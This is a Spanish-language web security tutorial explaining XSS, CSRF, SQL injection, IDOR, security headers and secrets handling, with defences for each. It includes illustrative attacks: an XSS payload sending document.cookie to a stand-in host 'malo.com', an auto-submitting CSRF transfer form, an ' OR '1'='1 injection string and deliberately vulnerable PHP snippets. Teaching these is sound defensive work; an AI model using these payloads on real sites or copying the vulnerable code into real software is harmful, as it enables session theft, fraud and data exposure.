# Seguridad web { .section-web }

> Casi todos los agujeros de una aplicación web salen del mismo error: confiar en algo que controla el usuario. La entrada de un formulario, un identificador en la URL, una cabecera, el nombre de un fichero. La defensa no es un producto que se instala: es una decisión repetida en cada punto donde entra un dato.

---

## El principio { .topic-title }

**Todo lo que llega de fuera es hostil hasta que se demuestre lo contrario.** De ahí salen tres reglas que ordenan el resto del tema:

1. **Validar al entrar** — comprobar que el dato es lo que dices que es, en el servidor.
2. **Escapar al salir** — según el destino: HTML, SQL, URL, JSON.
3. **Autorizar en la capa que el usuario no puede tocar** — la consulta, no la interfaz.

## XSS — ejecutar JavaScript ajeno en tu página { .topic-title }

Ocurre cuando un dato del usuario acaba en el HTML sin escapar:

```php
echo "<p>Hola, {$_GET['nombre']}</p>";
// ?nombre=<script>fetch('https://malo.com?c='+document.cookie)</script>
```

Ese script se ejecuta **con los permisos de tu página**: puede leer cookies, cambiar el DOM, enviar peticiones autenticadas.

| Tipo | Cómo llega |
|---|---|
| **Reflejado** | Va en la URL y se devuelve en la respuesta. Requiere que la víctima abra un enlace |
| **Almacenado** | Se guarda en la base de datos y afecta a todos los que vean esa página. El peor |
| **Basado en DOM** | Nunca pasa por el servidor: JavaScript inyecta el dato en la página |

**Defensa:**

- **Escapar al imprimir**, según el contexto. Twig lo hace solo; PHP puro necesita `htmlspecialchars()`.
- En JavaScript, **`textContent` en lugar de `innerHTML`** cuando el contenido es texto.
- **`Content-Security-Policy`** como red de seguridad.
- **`HttpOnly`** en la cookie de sesión: no evita el XSS, pero impide que el script robe la sesión.

!!! danger "`innerHTML` con datos del usuario es XSS de manual"
    ```js
    contenedor.innerHTML = `<p>${nombre}</p>`;   // ❌
    contenedor.textContent = nombre;             // ✅
    ```

    Es la vía más habitual del XSS basado en DOM, y no la detecta ninguna protección del servidor: el dato nunca pasa por él.

## CSRF — hacerte firmar algo sin querer { .topic-title }

El navegador **adjunta tus cookies automáticamente** a cualquier petición hacia ese dominio, venga de donde venga. Otra web puede aprovecharlo:

```html
<!-- en malo.com, mientras tienes sesión abierta en tubanco.com -->
<form action="https://tubanco.com/transferir" method="POST">
    <input type="hidden" name="destino" value="atacante">
</form>
<script>document.forms[0].submit();</script>
```

La petición sale con tu cookie de sesión y el servidor la ve legítima. El atacante no lee la respuesta —lo impide la política del mismo origen— pero **la operación ya se ha ejecutado**.

**Defensa:**

- **Token CSRF**: un valor imprevisible en cada formulario, que el servidor comprueba. El atacante no puede adivinarlo ni leerlo desde otro origen.
- **`SameSite=Lax`** en la cookie de sesión: el navegador no la adjunta en peticiones nacidas en otro sitio. Corta la mayoría de los casos.
- Que las operaciones que cambian estado **nunca sean `GET`**.

!!! tip "Con tokens en `Authorization` no hay CSRF"
    El ataque depende de que el navegador **adjunte la credencial solo**, y eso solo pasa con cookies. Si la credencial va en una cabecera `Authorization` que pone tu JavaScript, otra web no puede añadirla.

    Por eso las API con JWT en cabecera no necesitan token CSRF, y las aplicaciones con sesión por cookie sí. La decisión cookie o token arrastra esta consecuencia.

## Inyección SQL { .topic-title }

```php
$sql = "SELECT * FROM usuarios WHERE email = '$email'";
// $email = "' OR '1'='1"  → devuelve todos los usuarios
```

**Defensa: consultas preparadas, siempre.** El motor recibe la estructura y los datos por separado, y un valor no puede convertirse en instrucción.

!!! warning "Los nombres de tabla y columna no se pueden parametrizar"
    Un marcador solo vale para **valores**. Si la columna de ordenación viene del usuario (`?orden=precio`), hay que compararla contra una **lista blanca** antes de meterla en la consulta. Es el hueco por el que se cuela la inyección en código que por lo demás usa consultas preparadas.

## IDOR — acceder a lo que no es tuyo cambiando un número { .topic-title }

```
GET /pedidos/48     ← el tuyo
GET /pedidos/49     ← el de otro cliente
```

Si el servidor no comprueba **de quién es** el pedido, cualquiera recorre identificadores. Es de los fallos más frecuentes y más fáciles de explotar: basta con cambiar un número.

**Defensa:**

- Comprobar la propiedad **en cada acceso**, no solo en el listado. Filtrar el listado no protege la carga directa por identificador.
- Devolver **`404` en lugar de `403`** en recursos con dueño: un `403` confirma que el recurso existe.
- Identificadores no adivinables (UUID) ayudan, pero **no sustituyen** a la comprobación.

## Cabeceras de seguridad { .topic-title }

| Cabecera | Qué evita |
|---|---|
| `Content-Security-Policy` | Limita de dónde se cargan scripts, estilos e imágenes. La defensa de fondo contra XSS |
| `Strict-Transport-Security` | Obliga a HTTPS en visitas futuras, aunque se escriba `http://` |
| `X-Content-Type-Options: nosniff` | Impide que el navegador adivine el tipo e interprete un fichero como script |
| `Referrer-Policy` | Controla cuánta URL se filtra al navegar fuera |
| `frame-ancestors` (en CSP) | Impide que tu página se incruste en un iframe ajeno (*clickjacking*). Sustituye a `X-Frame-Options` |

!!! tip "La CSP se implanta en dos fases"
    Una política estricta rompe la página el primer día. El camino: publicarla primero como `Content-Security-Policy-Report-Only`, que **no bloquea nada** pero informa de lo que bloquearía, revisar los avisos durante unos días, ajustar, y solo entonces activarla de verdad.

## Contraseñas y secretos { .topic-title }

- **`password_hash()` / `password_verify()`**. Nunca `md5` ni `sha1`: son rápidos a propósito, que es justo lo contrario de lo que hace falta.
- **Hashear no es cifrar.** Cifrar es reversible; hashear no. Una contraseña se hashea porque nadie, ni el propio sistema, debería poder recuperarla.
- **Los secretos van en variables de entorno**, nunca en el repositorio. Un `.env` con credenciales subido a un repositorio público se encuentra con un buscador en minutos.
- Si un secreto se filtra, **rotarlo**. Borrar el commit no basta: sigue en el historial y en los clones.

!!! danger "El mensaje de error también filtra"
    Una traza en pantalla enseña rutas del servidor, consultas y a veces credenciales. En producción: mensaje genérico para el usuario, detalle completo **solo** en el registro.

    Y en los registros, cuidado con lo contrario: no guardar contraseñas, tokens ni datos personales por descuido al volcar el cuerpo de una petición.

## Lo que no es seguridad { .topic-title }

<div class="pros-cons" markdown>

| No protege | Por qué |
|---|---|
| Validación en el navegador | Se salta con el inspector o con `curl` |
| Ocultar un botón en la interfaz | La ruta sigue existiendo |
| CORS | Solo afecta a navegadores; `curl` lo ignora |
| Identificadores largos o aleatorios | Retrasan, no impiden |
| Instrucciones en el prompt de un modelo | Es una sugerencia a un generador de texto, no un límite |

</div>

Todas comparten el mismo defecto: viven en una capa que el usuario controla o puede rodear. **La comprobación tiene que estar donde la petición no puede no pasar.**

---

## 📚 Fuentes { .topic-title }

| Fuente | Enlace |
|---|---|
| 🛡️ **OWASP Top 10** | [owasp.org/www-project-top-ten](https://owasp.org/www-project-top-ten/) |
| 🛡️ **OWASP Cheat Sheet Series** | [cheatsheetseries.owasp.org](https://cheatsheetseries.owasp.org/) |
| 📗 **MDN — Seguridad web** | [developer.mozilla.org/es/docs/Web/Security](https://developer.mozilla.org/es/docs/Web/Security) |
